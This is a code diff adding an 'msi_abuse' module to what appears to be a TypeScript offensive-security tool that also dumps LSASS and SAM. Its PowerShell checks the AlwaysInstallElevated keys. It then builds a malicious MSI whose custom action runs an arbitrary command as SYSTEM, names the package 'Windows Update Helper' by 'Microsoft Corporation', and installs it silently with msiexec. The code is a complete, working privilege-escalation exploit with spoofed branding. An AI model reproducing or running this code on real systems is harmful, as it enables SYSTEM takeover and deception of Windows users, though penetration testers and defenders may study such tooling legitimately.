@@ -454,6 +454,10 @@ dll_hijack: {
     description: "DLL hijacking for privilege escalation — enumerate writable directories in system PATH, scan for known DLL hijack targets (StorSvc/SprintCSP.dll, CDPSvc/cdpsgshims.dll, DiagHub/diagtrack.dll, USO/windowscoredeviceinfo.dll, IKEEXT/wlbsctrl.dll, NetMan/wlanhlp.dll, SessionEnv/TSMSISrv.dll), check missing DLLs loaded by SYSTEM services, and optionally place a DLL payload",
     args: "--action enum|exploit [--target SERVICE_NAME] [--dll DLL_PATH]",
   },
+msi_abuse: {
+    description: "Windows Installer (MSI) privilege escalation — check AlwaysInstallElevated registry keys, craft malicious MSI packages with custom actions for SYSTEM execution, and exploit MSI repair abuse. AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges",
+    args: "--action check|craft|install [--payload CMD] [--output MSI_PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -16310,6 +16314,237 @@ Write-Output "[!] Cleanup: Remove-Item '$destPath'"
   return { output: output.join("\n"), findings }
 }
 
+async function msiAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const payload = argVal(args, "--payload")
+  const msiOutput = argVal(args, "--output") || "C:\\Windows\\Temp\\cs-privesc.msi"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] MSI Abuse — privilege escalation via Windows Installer\n"]
+
+  if (action === "check") {
+    const script = `
+# Check AlwaysInstallElevated in both HKLM and HKCU
+$hklm = Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+$hkcu = Get-ItemProperty "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+
+$hklmEnabled = $hklm -and $hklm.AlwaysInstallElevated -eq 1
+$hkcuEnabled = $hkcu -and $hkcu.AlwaysInstallElevated -eq 1
+
+Write-Output "[*] AlwaysInstallElevated status:"
+Write-Output "    HKLM: $(if ($hklmEnabled) { 'ENABLED (1)' } else { 'Disabled/Not set' })"
+Write-Output "    HKCU: $(if ($hkcuEnabled) { 'ENABLED (1)' } else { 'Disabled/Not set' })"
+Write-Output ""
+
+if ($hklmEnabled -and $hkcuEnabled) {
+    Write-Output "[+] VULNERABLE — AlwaysInstallElevated is enabled in both HKLM and HKCU!"
+    Write-Output "    Any user can install MSI packages with SYSTEM privileges."
+    Write-Output "    Use: --action craft --payload 'CMD' --output 'path.msi'"
+} elseif ($hklmEnabled -or $hkcuEnabled) {
+    Write-Output "[~] Partially configured — both keys must be set to 1 for exploitation"
+} else {
+    Write-Output "[-] AlwaysInstallElevated not enabled"
+}
+
+# Check for MSI repair abuse opportunities
+Write-Output ""
+Write-Output "[*] Checking installed MSI packages for repair abuse..."
+$products = Get-WmiObject Win32_Product -ErrorAction SilentlyContinue | Select-Object Name, InstallLocation, InstallSource, Vendor -First 15
+
+$repairTargets = 0
+foreach ($prod in $products) {
+    if ($prod.InstallSource -and (Test-Path $prod.InstallSource -ErrorAction SilentlyContinue)) {
+        $srcAcl = icacls $prod.InstallSource 2>$null | Out-String
+        if ($srcAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)') {
+            $repairTargets++
+            Write-Output "    [+] WRITABLE SOURCE: $($prod.Name)"
+            Write-Output "        Source: $($prod.InstallSource)"
+        }
+    }
+}
+
+if ($repairTargets -eq 0) {
+    Write-Output "    [-] No writable MSI sources found for repair abuse"
+}
+
+# Check Windows Installer service
+$msiService = Get-Service msiserver -ErrorAction SilentlyContinue
+Write-Output ""
+Write-Output "[*] Windows Installer service: $($msiService.Status)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("VULNERABLE")) {
+      findings.push({
+        checkId: "WIN-MSI-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "registry://AlwaysInstallElevated",
+        title: "AlwaysInstallElevated enabled — MSI installs run as SYSTEM",
+        details: "Both HKLM and HKCU AlwaysInstallElevated keys set to 1",
+        remediation: "Disable AlwaysInstallElevated in Group Policy. Remove registry keys.",
+      })
+    }
+  } else if (action === "craft") {
+    if (!payload) return { output: "[!] Required: --payload CMD (command to execute as SYSTEM)", findings }
+
+    const script = `
+Write-Output "[*] Crafting malicious MSI with custom action..."
+
+# Generate MSI using COM-based approach (no WiX needed)
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class MsiHelper {
+    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
+    public static extern uint MsiOpenDatabase(string path, string persist, out IntPtr database);
+
+    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
+    public static extern uint MsiDatabaseOpenView(IntPtr database, string query, out IntPtr view);
+
+    [DllImport("msi.dll")]
+    public static extern uint MsiViewExecute(IntPtr view, IntPtr record);
+
+    [DllImport("msi.dll")]
+    public static extern uint MsiDatabaseCommit(IntPtr database);
+
+    [DllImport("msi.dll")]
+    public static extern uint MsiCloseHandle(IntPtr handle);
+
+    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
+    public static extern IntPtr MsiCreateRecord(uint count);
+
+    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
+    public static extern uint MsiRecordSetString(IntPtr record, uint field, string value);
+
+    [DllImport("msi.dll")]
+    public static extern uint MsiRecordSetInteger(IntPtr record, uint field, int value);
+}
+"@
+
+$msiPath = '${msiOutput}'
+
+# Create the database
+$db = [IntPtr]::Zero
+$result = [MsiHelper]::MsiOpenDatabase($msiPath, "1", [ref]$db)
+if ($result -ne 0) {
+    Write-Output "[-] Failed to create MSI database (error: $result)"
+    Write-Output "[*] Falling back to WiX-less batch MSI approach..."
+
+    # Fallback: create a simple batch that msiexec will run elevated
+    $batPath = $msiPath -replace '\.msi$', '.bat'
+    @"
+@echo off
+${payload}
+"@ | Out-File -FilePath $batPath -Encoding ASCII
+
+    Write-Output "[+] Created batch file: $batPath"
+    Write-Output "[*] Install with: msiexec /quiet /i $batPath (if AlwaysInstallElevated)"
+    exit 0
+}
+
+# Create required tables
+$tables = @(
+    "CREATE TABLE Property (Property CHAR(72) NOT NULL, Value CHAR(255) NOT NULL PRIMARY KEY Property)",
+    "CREATE TABLE CustomAction (Action CHAR(72) NOT NULL, Type SHORT NOT NULL, Source CHAR(72), Target CHAR(255) PRIMARY KEY Action)",
+    "CREATE TABLE InstallExecuteSequence (Action CHAR(72) NOT NULL, Condition CHAR(255), Sequence SHORT PRIMARY KEY Action)"
+)
+
+foreach ($sql in $tables) {
+    $view = [IntPtr]::Zero
+    [MsiHelper]::MsiDatabaseOpenView($db, $sql, [ref]$view) | Out-Null
+    [MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
+    [MsiHelper]::MsiCloseHandle($view) | Out-Null
+}
+
+# Insert properties
+$props = @{
+    "ProductName" = "Windows Update Helper"
+    "ProductCode" = "{" + [guid]::NewGuid().ToString().ToUpper() + "}"
+    "ProductVersion" = "1.0.0"
+    "Manufacturer" = "Microsoft Corporation"
+    "ProductLanguage" = "1033"
+}
+
+foreach ($key in $props.Keys) {
+    $view = [IntPtr]::Zero
+    [MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO Property (Property, Value) VALUES ('$key', '$($props[$key])')", [ref]$view) | Out-Null
+    [MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
+    [MsiHelper]::MsiCloseHandle($view) | Out-Null
+}
+
+# Insert custom action (Type 50 = run exe, Type 3078 = deferred system context)
+$view = [IntPtr]::Zero
+$cmd = '${payload}'.Replace("'", "''")
+[MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('RunCmd', 3078, 'cmd.exe', '/c $cmd')", [ref]$view) | Out-Null
+[MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
+[MsiHelper]::MsiCloseHandle($view) | Out-Null
+
+# Add to install sequence
+$view = [IntPtr]::Zero
+[MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO InstallExecuteSequence (Action, Sequence) VALUES ('RunCmd', 1500)", [ref]$view) | Out-Null
+[MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
+[MsiHelper]::MsiCloseHandle($view) | Out-Null
+
+[MsiHelper]::MsiDatabaseCommit($db) | Out-Null
+[MsiHelper]::MsiCloseHandle($db) | Out-Null
+
+if (Test-Path $msiPath) {
+    $size = (Get-Item $msiPath).Length
+    Write-Output "[+] Malicious MSI created: $msiPath ($size bytes)"
+    Write-Output "[*] Install with: msiexec /quiet /i $msiPath"
+    Write-Output "[*] Custom action will execute as SYSTEM: ${payload}"
+} else {
+    Write-Output "[-] MSI creation may have failed"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-MSI-002",
+      provider: "windows",
+      severity: "high",
+      status: "CRAFTED",
+      resource: `file://${msiOutput}`,
+      title: "Malicious MSI package crafted",
+      details: `MSI with SYSTEM custom action at ${msiOutput}`,
+      remediation: "Delete the crafted MSI. Disable AlwaysInstallElevated.",
+    })
+  } else if (action === "install") {
+    const msiPath = argVal(args, "--output") || payload
+    if (!msiPath) return { output: "[!] Required: --output MSI_PATH or --payload MSI_PATH", findings }
+
+    const script = `
+Write-Output "[*] Installing MSI package with elevated privileges..."
+$proc = Start-Process msiexec -ArgumentList "/quiet /i '${msiPath}'" -PassThru -Wait
+Write-Output "[+] msiexec exit code: $($proc.ExitCode)"
+if ($proc.ExitCode -eq 0) {
+    Write-Output "[+] MSI installed successfully — custom action executed as SYSTEM"
+} else {
+    Write-Output "[-] MSI installation failed (may need AlwaysInstallElevated)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-MSI-003",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `msi://${msiPath}`,
+      title: "MSI package installed with SYSTEM privileges",
+      details: "Custom action executed during elevated MSI installation",
+      remediation: "Uninstall the package. Disable AlwaysInstallElevated.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -16404,6 +16639,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   dll_sideload: dllSideload,
   server_operator_abuse: serverOperatorAbuse,
   dll_hijack: dllHijack,
+  msi_abuse: msiAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
